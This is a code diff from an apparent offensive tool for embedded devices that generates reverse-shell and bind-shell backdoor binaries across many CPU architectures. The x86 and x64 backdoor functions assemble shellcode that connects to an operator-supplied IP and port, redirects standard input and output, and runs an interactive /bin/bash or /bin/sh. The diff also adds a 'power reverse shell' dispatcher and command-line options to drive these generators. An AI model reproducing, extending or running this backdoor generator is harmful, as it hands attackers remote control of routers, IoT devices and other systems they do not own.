+	shell_path_list = []
+	if shell_path == "/bin/bash" or shell_path == "bash":
+		shell_path = "/bin/bash"
+		shell_path_list.append(shell_path)
+		shell_path_list.append("-i")
+	elif shell_path == "/bin/sh" or shell_path == "sh":
+		shell_path = "/bin/sh"
+		shell_path_list.append(shell_path)
+		shell_path_list.append("-i")
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
 	shellcode = shellcraft.connect(reverse_ip, reverse_port)
 	shellcode += shellcraft.dup2('rbp',0)+shellcraft.dup2('rbp',1)+ shellcraft.dup2("rbp",2)
-	shellcode += shellcraft.sh()
+	shellcode += shellcraft.execve(shell_path, shell_path_list, envp)
 	shellcode = asm(shellcode)
 	ELF_data = make_elf(shellcode)
 	if(filename==None):
@@ -2530,15 +3068,31 @@ def x64el_backdoor(reverse_ip, reverse_port, filename=None):
 x86 x86el_backdoor
 2022.10.31 add
 '''
-def x86el_backdoor(reverse_ip, reverse_port, filename =None):
+def x86el_backdoor(shell_path ,reverse_ip, reverse_port, envp ,filename =None):
 	context.arch = 'i386'
 	context.bits = "32"
 	context.endian = "little"
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
+	shell_path_list = []
+	if shell_path == "/bin/bash" or shell_path == "bash":
+		shell_path = "/bin/bash"
+		shell_path_list.append(shell_path)
+		shell_path_list.append("-i")
+	elif shell_path == "/bin/sh" or shell_path == "sh":
+		shell_path = "/bin/sh"
+		shell_path_list.append(shell_path)
+		shell_path_list.append("-i")
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
 	shellcode = shellcraft.connect(reverse_ip, reverse_port)
 	shellcode += shellcraft.dup2('edx',0)+shellcraft.dup2('edx',1)+ shellcraft.dup2("edx",2)
-	shellcode += shellcraft.sh()
+	shellcode += shellcraft.execve(shell_path, shell_path_list, envp)
 	shellcode = asm(shellcode)
 	ELF_data = make_elf(shellcode)
 	if(filename==None):
@@ -3383,64 +3937,32 @@ def Introduction():
 	print(example_reverse)
 
 
-def x86el_backdoor(reverse_ip, reverse_port, filename=None):
-	context.arch = 'i386'
-	context.endian = 'little'
-	context.bits = '32'
-	log.success("reverse_ip is: "+ reverse_ip)
-	log.success("reverse_port is: "+str(reverse_port))
-	shellcode = shellcraft.connect(reverse_ip, reverse_port)
-	shellcode += shellcraft.dup2("edx",0)+shellcraft.dup2("edx",1)+shellcraft.dup2("edx",2)
-	shellcode += shellcraft.sh()
-	shellcode = asm(shellcode)
-	ELF_data = make_elf(shellcode)
-	if(filename==None):
-		log.info("waiting 3s")
-		sleep(1)
-		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,chars)
-		f=open(filename,"wb")
-		f.write(ELF_data)
-		f.close()
-		os.chmod(filename, 0o755)
-		log.success("{} is ok in current path ./".format(filename))
-	else:
-		if(os.path.exists(filename) != True):
-			log.info("waiting 3s")
-			sleep(1)
-			f=open(filename,"wb")
-			f.write(ELF_data)
-			f.close()
-			os.chmod(filename, 0o755)
-			log.success("{} is ok in current path ./".format(filename))
-			context.arch='i386'
-			context.bits="32"
-			context.endian="little"
-		else:
-			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
-			choise = input()
-			if choise == "y\n" or choise == "\n":
-				log.info("waiting 3s")
-				sleep(1)
-				f=open(filename,"wb")
-				f.write(ELF_data)
-				f.close()
-				os.chmod(filename, 0o755)
-				log.success("{} is ok in current path ./".format(filename))
-				context.arch='i386'
-				context.bits="32"
-				context.endian="little"
-			else:
-				return 
 
-def x64el_backdoor(reverse_ip, reverse_port, filename=None):
+def x64el_backdoor(shell_path ,reverse_ip, reverse_port, envp,filename=None):
 	context.arch = 'amd64'
 	context.endian = 'little'
 	context.bits = '64'
 	log.success("reverse_ip is: "+ reverse_ip)
 	log.success("reverse_port is: "+str(reverse_port))
+	shell_path_list = []
+	if shell_path == "/bin/bash" or shell_path == "bash":
+		shell_path = "/bin/bash"
+		shell_path_list.append(shell_path)
+		shell_path_list.append("-i")
+	elif shell_path == "/bin/sh" or shell_path == "sh":
+		shell_path = "/bin/sh"
+		shell_path_list.append(shell_path)
+		shell_path_list.append("-i")
+	else:
+		log.info("now shell is only support sh and bash")
+		return 
+	if(envp == None):
+		envp = 0
+	else:
+		envp = my_package.get_envir_args(envp)
 	shellcode = shellcraft.connect(reverse_ip, reverse_port)
 	shellcode += shellcraft.dup2("rbp",0)+shellcraft.dup2("rbp",1)+shellcraft.dup2("rbp",2)
-	shellcode += shellcraft.sh()
+	shellcode += shellcraft.execve(shell_path, shell_path_list, envp)
 	shellcode = asm(shellcode)
 	ELF_data = make_elf(shellcode)
 	if(filename==None):
@@ -3560,7 +4082,16 @@ def test1():
 '''
 
 def get_version():
-    return Fore.GREEN+"Version: 0.3.0"+Fore.RESET
+    return Fore.GREEN+"Version: 0.3.1"+Fore.RESET
+
+
+'''
+print model and arch list
+'''
+
+def model_list():
+	model_choise.txt_to_dict()
+	model_choise.print_mmodel_dic()
 
 
 reverse_backdoor_dic = {
@@ -3603,7 +4134,10 @@ reverse_shellcode_dic = {
 	14: powerpc_info.ppc_reverse_sl,
 	15: powerpc_info.ppcle_reverse_sl,
 	16: powerpc_info.ppc64_reverse_sl,
-	17: powerpc_info.ppc64le_reverse_sl
+	17: powerpc_info.ppc64le_reverse_sl,
+	18: None,
+	19: None,
+	20: None
 }
 
 hackebds_cmd_dic = {
@@ -3621,10 +4155,12 @@ hackebds_cmd_dic = {
 	12: hackebds_cmd.aarch64_cmd_file,
 	13: hackebds_cmd.riscv64el_cmd_file,
 	14: hackebds_cmd.powerpc_cmd_file,
-	15: None,
-	16: None,
-	17: None,
-	18: None
+	15: hackebds_cmd.powerpcle_cmd_file,
+	16: hackebds_cmd.powerpc64_cmd_file,
+	17: hackebds_cmd.powerpc64le_cmd_file,
+	18: hackebds_cmd.sparc_cmd_file,
+	19: None,
+	20: hackebds_cmd.sparc64_cmd_file
 }
 
 bind_shell_dic = {
@@ -3645,7 +4181,32 @@ bind_shell_dic = {
 	15: None,
 	16: None,
 	17: None,
-	18: sparc32.sparc_bind_shell
+	18: sparc32.sparc_bind_shell,
+	19: None,
+	20: None,
+}
+
+power_reverse_shell = {
+	1: power_reverse_shell.mips_power_reverse_shell,
+	2: power_reverse_shell.mipsel_power_reverse_shell,
+	3: power_reverse_shell.mips64_power_reverse_shell,
+	4: power_reverse_shell.mips64el_power_reverse_shell,
+	5: None,
+	6: power_reverse_shell.armelv7_power_reverse_shell,
+	7: None,
+	8: power_reverse_shell.armebv7_power_reverse_shell,
+	9: power_reverse_shell.aarch64_power_reverse_shell,
+	10: power_reverse_shell.x86_power_reverse_shell,
+	11: power_reverse_shell.x64_power_reverse_shell,
+	12: power_reverse_shell.android_power_reverse_shell,
+	13: power_reverse_shell.riscv64_power_reverse_shell,
+	14: power_reverse_shell.powerpc_power_reverse_shell,
+	15: power_reverse_shell.powerpcle_power_reverse_shell,
+	16: None,
+	17: None,
+	18: power_reverse_shell.sparc_power_reverse_shell,
+	19: None,
+	20: power_reverse_shell.sparc64_power_reverse_shell
 }
 
 
@@ -3681,10 +4242,10 @@ def arch_get_number(input_arch):
 	fun = arch_2_num_dic.get(input_arch)
 	return fun
 
-def num_getreverse_file(number, reverse_ip, reverse_port, filename):
+def num_getreverse_file(number, shell_path,reverse_ip, reverse_port, envp,filename):
 
     fun = reverse_backdoor_dic.get(number)
-    return fun(reverse_ip, reverse_port, filename)
+    return fun(shell_path ,reverse_ip, reverse_port, envp,filename)
 
 def num_getreverse_shellcode(number, reverse_ip, reverse_port):
 
@@ -3701,6 +4262,25 @@ def num_get_file_cmd(number, CMD_PATH,CMD, envp,filename):
 	return fun(CMD, CMD_PATH , envp, filename)
 
 
+def num_get_power_reverse_shell(num, shell_path ,reverse_ip, reverse_port, envp ,filename):
+	fun = power_reverse_shell.get(num)
+	return fun(shell_path, reverse_ip, reverse_port, envp,filename)
+
+
+def check_ip(strip):
+	try:
+		socket.inet_aton(strip)
+		return True
+	except Exception as e:
+		log.error("IP error")
+
+def check_port(intport):
+	if (intport >0 and intport<65535):
+		return True
+	else:
+		log.error("port error")
+
+
 def main():
 	parser = argparse.ArgumentParser()
 	parser.add_argument('-reverse_ip', required=False, type=str, default=None, help='reverse_ip set')
@@ -3711,10 +4291,12 @@ def main():
 	parser.add_argument('-model', required=False, type=str,default=None, help='device model,learn module')
 	parser.add_argument('-bind_port', required=False, type=int,default=None, help='bind_shell port')
 	parser.add_argument('-filename', required=False, type=str,default=None, help='Generate file name')
-	parser.add_argument('-cmd_path', required=False, type=str,default="/bin/sh", help='execute file path')
+	parser.add_argument('-shell', required=False, type=str,default="/bin/sh", help='cmd shell or execute file path')
 	parser.add_argument('-cmd', required=False, type=str,default=None, help='Commands executed')
 	parser.add_argument('-envp', required=False, type=str,default=None, help='Commands envp')
 	parser.add_argument('-encode', '--encode' ,action='store_true', help='encode backdoor')
+	parser.add_argument('-power', '--power' ,action='store_true',help='powerful reverse shell')
+	parser.add_argument('-l', '--list' ,action='store_true',help='print model list')
 	parser.add_argument('-v', '--version' ,action='version', version=get_version(), help='Display version')
 	#envp
 	#parser.add_argument("-v","--version", help="version",action="store_true")
@@ -3722,6 +4304,9 @@ def main():
 	flag_cve_info = 0
 	#@with_argparser(argparse)
 	args = parser.parse_args()
+	if(args.list == True):
+		model_list()
+		return 
 	if (args.model != None):
 		if (".." in args.model or "/" in args.model ):
 			log.error("Illegal characters exist in")
@@ -3745,7 +4330,6 @@ def main():
 	if(args.arch != None and args.model != None):
 		flag_cve_info = 1
 		try:
-			#print("doudoudedi")
 			dic_arch = model_choise.model_to_arch(args.model)
 			if (dic_arch == args.arch):
 				args.arch = dic_arch
@@ -3780,47 +4364,62 @@ def main():
 			return 
 
 	if(args.model == None and args.arch==None):
-		log.error("please set arch or model")
+		log.info("please set arch or model")
 		return 
 
 	if (args.res == "reverse_shell_file" and args.arch != None and args.encode == False ):
-		if (args.reverse_ip!=None or args.reverse_port != None):
-      
-			try:
-				num_getreverse_file(arch_get_number(args.arch), args.reverse_ip, args.reverse_port, args.filename)
-				return
+		if (args.reverse_ip!=None and args.reverse_port != None):
+			if (check_ip(args.reverse_ip)==True and check_port(args.reverse_port)==True):
+				if(args.power == True):
+					num_get_power_reverse_shell(arch_get_number(args.arch), args.shell,args.reverse_ip, args.reverse_port, args.envp ,args.filename)
+					return 
+				else:
+					try:
+						num_getreverse_file(arch_get_number(args.arch), args.shell ,args.reverse_ip, args.reverse_port, args.envp ,args.filename)
+						return
 
-			except Exception as e:
-				print(e)
-				log.info("please check your IP format and PORT ,If it is correct then The function is still under development. Please wait")
+					except Exception as e:
+						log.info("please check your IP format and PORT ,If it is correct then The function is still under development or environmental problems")
+						return 
+			else:
+				log.info("IP or PORT format error")
+				return 
 		else:
 			log.info("please set reverse_ip or reverse_port")
 			return 
 
 	if (args.res == "reverse_shellcode" and args.arch != None and args.encode == False ):
-		if (args.reverse_ip!=None or args.reverse_port != None):
-			try:
-				num_getreverse_shellcode(arch_get_number(args.arch), args.reverse_ip, args.reverse_port)
+		if (args.reverse_ip!=None and args.reverse_port != None):
+			if (check_ip(args.reverse_ip)==True and check_port(args.reverse_port)==True):
+				try:
+					num_getreverse_shellcode(arch_get_number(args.arch), args.reverse_ip, args.reverse_port)
+					return 
+					
+				except Exception as e:
+					log.info("please check your IP format and PORT ,If it is correct then function is still under development or environmental problems")
+					return 
+			else:
+				log.info("IP or PORT format error")
 				return 
-				
-			except Exception as e:
-				print(e)
-				log.info("please check your IP format and PORT ,If it is correct then function is still under development. Please wait")
 		else:
 			log.error("please set reverse_ip or reverse_port")
-			return 
 
 	if (args.res == "bind_shell"):
 		try:
-			if (args.passwd==None or args.bind_port == None and args.arch!=None and args.encode == False ):
+			if (args.passwd!=None and args.bind_port != None and args.arch!=None and args.encode == False ):
+	
+				if (check_port(args.reverse_port)==True):
+					num_getbind_shell(arch_get_number(args.arch), args.bind_port, args.passwd, args.filename)
+					return 
+				else:
+					log.info("PORT format error")
+					return 
+			else:
 				log.info("please set bind passwd or bind_port")
 				return 
-
-			num_getbind_shell(arch_get_number(args.arch), args.bind_port, args.passwd, args.filename)
-			return 
 		except Exception as e:
-			log.info("please check your IP format and PORT ,If it is correct then function is still under development. Please wait")
-			print(e)
+			log.info("please check your IP format and PORT ,If it is correct then function is still under development or environmental problems")
+			return 
 			#pass
 		
 	if (flag_cve_info == 1 and args.res=="cveinfo" ):
@@ -3830,17 +4429,16 @@ def main():
 	if (args.res == "cmd_file" and args.arch != None and args.encode == False ):
 		if(args.cmd != None):
 			try:
-				num_get_file_cmd(arch_get_number(args.arch), args.cmd_path, args.cmd, args.envp,args.filename)
+				num_get_file_cmd(arch_get_number(args.arch), args.shell, args.cmd, args.envp,args.filename)
 				return 
 			except Exception as e:
-				print(e)
-				log.info("function is still under development. Please wait")
+				log.info("function is still under development or environmental problems")
 				return 
 		else:
 			log.info("please set command")
 			return 
 	else:
-		log.info("function is still under development. Please wait")
+		log.info("function is still under development or environmental problems")
 		return 
 
 if __name__ == "__main__":
